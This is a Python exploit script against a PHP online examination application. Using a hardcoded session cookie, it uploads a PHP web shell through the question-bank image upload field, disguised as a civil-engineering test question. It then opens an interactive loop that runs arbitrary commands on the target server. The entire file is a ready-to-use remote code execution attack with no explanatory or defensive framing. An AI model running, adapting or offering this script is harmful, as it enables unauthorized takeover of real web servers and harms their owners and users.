import requests, sys, urllib, re
import datetime
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)




GREEN =  '\033[32m' # Green Text
RED =  '\033[31m' # Red Text
RESET = '\033[m' # reset to the defaults

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


#Create a new session
s = requests.Session() 


#Set Cookie
cookies = {'PHPSESSID': 'd794ba06fcba883d6e9aaf6e528b0733'}

LINK=input("Enter URL of The Vulnarable Application : ")


def webshell(LINK, session):
    try:
        WEB_SHELL = LINK+'/system/system/admins/assessments/databank/files/'+filename
        getdir  = {'cmd': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)


#Creating a PHP Web Shell

phpshell  = {
               'personImage': 
                  (
                   'kh4waja.php', 
                   '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 
                   'application/octet-stream', 
                  {'Content-Disposition': 'form-data'}
                  ) 
             }

# Defining value for form data
data = {'difficulty_id':'1', 'test_desc':'CIVIL ENGINEERING', 'test_desc':'CIVIL ENGINEERING', 'test_subject':'Mathematics, Surveying and Transportation Engineering', 'description':'Hello World', 'option_a':'a', 'option_b':'b', 'option_c':'c', 'option_d':'d',  'answer':'A', 'btnAddQuestion':'Save' }


filename = 'kh4waja.php'
#Uploading Reverse Shell
print("[*]Uploading PHP Shell For RCE...")
upload = s.post(LINK+'system/system/admins/assessments/databank/btn_functions.php?action=add', cookies=cookies, files=phpshell, data=data)

shell_upload = True if("" in upload.text) else False
u=shell_upload
if u:
	print(GREEN+"[+]PHP Shell has been uploaded successfully!", RESET)
else:
	print(RED+"[-]Failed To Upload The PHP Shell!", RESET)



#Executing The Webshell
webshell(LINK, s)